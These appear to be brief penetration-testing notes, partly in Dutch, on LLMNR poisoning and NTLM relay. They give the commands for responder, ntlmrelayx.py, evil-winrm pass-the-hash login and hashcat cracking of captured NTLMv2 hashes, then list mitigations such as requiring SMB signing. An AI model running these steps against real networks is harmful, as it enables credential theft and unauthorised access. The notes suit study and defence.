1) Set-up ntlmrelayx.py
2) Set-up responder (responder cannot block smb or https for ntlmrelayx.py)
3) Wait for a user to make a type \\pintserver
4) Login using the hash

sudo ntlmrelayx.py -t <ip> -smb2support
sudo responder -I <network_interface> -rdwv
evil-winrm -i <ip> -u <user> -H '<hash>'

https://he-no.github.io/2020/04/10/InfoSec/Network_Vulnerability/LLMNR/


Mitigate:
	- Disable WINS: NetBIOS over TCP/IP
	- Gpedit: Turn off multicast name resolution
	- Require SMB signing

Key flaw is that the services utilize a users's username and NTLMv2 hash when appropriately respond to

Diepere uitleg ivm LLMNR (poisoning)

Crackable met hashcat: hashcat -m 5600 hashes.txt rockyou.txt

Of relay using ntlmrelayx.py: